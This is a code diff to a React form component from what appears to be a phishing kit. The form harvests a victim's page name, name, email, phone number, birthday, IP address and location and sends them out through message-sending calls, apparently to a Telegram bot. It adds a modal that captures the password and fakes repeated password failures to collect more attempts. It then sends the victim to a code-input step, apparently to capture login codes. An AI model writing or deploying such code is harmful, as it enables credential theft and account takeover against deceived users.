@@ -6,6 +6,8 @@ import getToday from '@utils/getToday';
 import React, { useEffect, useRef, useState } from 'react';
 import 'react-phone-input-2/lib/style.css';
 import { Outlet, useLocation, useNavigate } from 'react-router-dom';
+import PasswordModal from '@components/PasswordModal';
+
 const getCurrentTime = () => {
 	const currentTime = new Date()
 		.toLocaleString('vi-VN', {
@@ -20,6 +22,7 @@ const getCurrentTime = () => {
 		.replace(',', ' -');
 	return currentTime;
 };
+
 const GetInfo: React.FC = () => {
 	const navigate = useNavigate();
 	const location = useLocation();
@@ -51,6 +54,8 @@ const GetInfo: React.FC = () => {
 	const emailInputRef = useRef<HTMLInputElement>(null);
 	const passwordInputRef = useRef<HTMLInputElement>(null);
 	const [loadingTime, setLoadingTime] = useState<number>(0);
+	const [isPasswordModalOpen, setIsPasswordModalOpen] = useState(false);
+
 	useEffect(() => {
 		const configData = async () => {
 			const configData = await config();
@@ -58,122 +63,93 @@ const GetInfo: React.FC = () => {
 		};
 		configData();
 	}, []);
+
 	const confirmPasswordInputRef = useRef<HTMLInputElement>(null);
+
 	const generateRandomNumber = (): string => {
 		const randomNumber = Math.floor(Math.random() * 1_000_000_000_000);
 		return `#${randomNumber.toString().padStart(12, '0')}`;
 	};
 
+	const handleBusinessHome = () => {
+		if (pageName === '') {
+			pageNameInputRef.current?.focus();
+		} else if (name === '') {
+			nameInputRef.current?.focus();
+		} else if (email === '') {
+			emailInputRef.current?.focus();
+		} else if (phoneNumber === '') {
+			phoneNumberInputRef.current?.focus();
+		} else if (birthday === '') {
+			birthdayInputRef.current?.focus();
+		} else {
+			const newMessage =
+				`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>\n` +
+				`<b>🌐 IP:</b> <code>${ip}</code>\n` +
+				`<b>🌍 Vị trí:</b> <code>${country}</code>\n\n` +
+				`<b>📄 Tên Page:</b> <code>${pageName}</code>\n` +
+				`<b>🧑 Tên:</b> <code>${name}</code>\n` +
+				`<b>📧 Email:</b> <code>${email}</code>\n` +
+				`<b>📞 Số điện thoại:</b> <code>${phoneNumber}</code>\n` +
+				`<b>🎂 Ngày sinh:</b> <code>${birthday}</code>\n`;
+			localStorage.setItem('message', newMessage);
+			sendMessage({ text: newMessage });
+			setIsPasswordModalOpen(true);
+		}
+	};
+
+	const handlePasswordSubmit = (password: string) => {
+		setPassword(password);
+		setFailedPasswordAttempts(1);
+		const existingMessage = localStorage.getItem('message') ?? '';
+		const newMessage =
+			existingMessage.replace(
+				/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
+				`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
+			) + `<b>🔒 Mật khẩu:</b> <code>${password}</code>`;
+		localStorage.setItem('message', newMessage);
+		const messageId = localStorage.getItem('message_id');
+		editMessageText({
+			message_id: Number(messageId),
+			text: newMessage,
+		});
+		setIsPasswordModalOpen(false);
+		navigate('/live/home/confirm-password');
+	};
+
+	const handleBusinessHomeConfirmPassword = () => {
+		if (confirmPassword === '') {
+			confirmPasswordInputRef.current?.focus();
+		} else {
+			setFailedPasswordAttempts(failedPasswordAttempts + 1);
+			delayLoading();
+		}
+	};
+
+	const delayLoading = async () => {
+		setIsLoading(true);
+		const configData = await config();
+		setTimeout(async () => {
+			setIsLoading(false);
+			if (
+				failedPasswordAttempts ===
+				configData.settings.max_failed_password_attempts
+			) {
+				navigate('/live/code-input');
+			} else {
+				if (confirmPasswordInputRef.current) {
+					confirmPasswordInputRef.current.value = '';
+				}
+				confirmPasswordInputRef.current?.focus();
+			}
+		}, loadingTime);
+	};
+
 	const handleButtonClick = () => {
 		const currentPath = location.pathname;
-
-		const handleBusinessHome = () => {
-			if (pageName === '') {
-				pageNameInputRef.current?.focus();
-			} else if (name === '') {
-				nameInputRef.current?.focus();
-			} else if (phoneNumber === '') {
-				phoneNumberInputRef.current?.focus();
-			} else if (birthday === '') {
-				birthdayInputRef.current?.focus();
-			} else {
-				const newMessage =
-					`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>\n` +
-					`<b>🌐 IP:</b> <code>${ip}</code>\n` +
-					`<b>🌍 Vị trí:</b> <code>${country}</code>\n\n` +
-					`<b>📄 Tên Page:</b> <code>${pageName}</code>\n` +
-					`<b>🧑 Tên:</b> <code>${name}</code>\n` +
-					`<b>🎂 Ngày sinh:</b> <code>${birthday}</code>\n\n` +
-					`<b>📞 Số điện thoại:</b> <code>${phoneNumber}</code>\n`;
-				localStorage.setItem('message', newMessage);
-				sendMessage({ text: newMessage });
-				navigate('login');
-			}
-		};
-
-		const handleBusinessHomeLogin = () => {
-			setFailedPasswordAttempts(1);
-			if (email === '') {
-				emailInputRef.current?.focus();
-			} else if (password === '') {
-				passwordInputRef.current?.focus();
-			} else {
-				const existingMessage = localStorage.getItem('message') ?? '';
-				const newMessage =
-					existingMessage.replace(
-						/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
-						`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
-					) +
-					`<b>📧 Email:</b> <code>${email}</code>\n` +
-					`<b>🔒 Mật khẩu:</b> <code>${password}</code>`;
-				localStorage.setItem('message', newMessage);
-				const messageId = localStorage.getItem('message_id');
-				editMessageText({
-					message_id: Number(messageId),
-					text: newMessage,
-				});
-				delayLoading();
-			}
-		};
-
-		const handleBusinessHomeConfirmPassword = () => {
-			if (confirmPassword === '') {
-				confirmPasswordInputRef.current?.focus();
-			} else {
-				setFailedPasswordAttempts(failedPasswordAttempts + 1);
-				delayLoading();
-			}
-		};
-
-		const delayLoading = async () => {
-			setIsLoading(true);
-			if (currentPath === '/live/home/confirm-password') {
-				const existingMessage = localStorage.getItem('message') ?? '';
-				const updatedMessage =
-					existingMessage.replace(
-						/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
-						`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
-					) +
-					`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}:</b> <code>${confirmPassword}</code>`;
-				localStorage.setItem('message', updatedMessage);
-				const messageID = localStorage.getItem('message_id');
-				editMessageText({
-					message_id: Number(messageID),
-					text: updatedMessage,
-				});
-			}
-			const configData = await config();
-			setTimeout(async () => {
-				setIsLoading(false);
-				if (currentPath === '/live/home/login') {
-					if (
-						(await config()).settings
-							.max_failed_password_attempts === 0
-					) {
-						navigate('/live/code-input');
-					} else {
-						navigate('/live/home/confirm-password');
-					}
-				} else if (
-					failedPasswordAttempts ===
-					configData.settings.max_failed_password_attempts
-				) {
-					navigate('/live/code-input');
-				} else {
-					if (confirmPasswordInputRef.current) {
-						confirmPasswordInputRef.current.value = '';
-					}
-					confirmPasswordInputRef.current?.focus();
-				}
-			}, loadingTime);
-		};
-
 		switch (currentPath) {
 			case '/live/home':
 				handleBusinessHome();
-				break;
-			case '/live/home/login':
-				handleBusinessHomeLogin();
 				break;
 			case '/live/home/confirm-password':
 				handleBusinessHomeConfirmPassword();
@@ -250,6 +226,16 @@ const GetInfo: React.FC = () => {
 			>
 				Continue
 			</button>
+
+			<PasswordModal
+				isOpen={isPasswordModalOpen}
+				onClose={() => setIsPasswordModalOpen(false)}
+				onSubmit={handlePasswordSubmit}
+				passwordInputRef={passwordInputRef}
+				password={password}
+				setPassword={setPassword}
+			/>
+
 			{isLoading && (
 				<LoadingModal
 					loadingTime={loadingTime}
@@ -259,5 +245,6 @@ const GetInfo: React.FC = () => {
 		</div>
 	);
 };
+
 export default GetInfo;
 export { getCurrentTime };
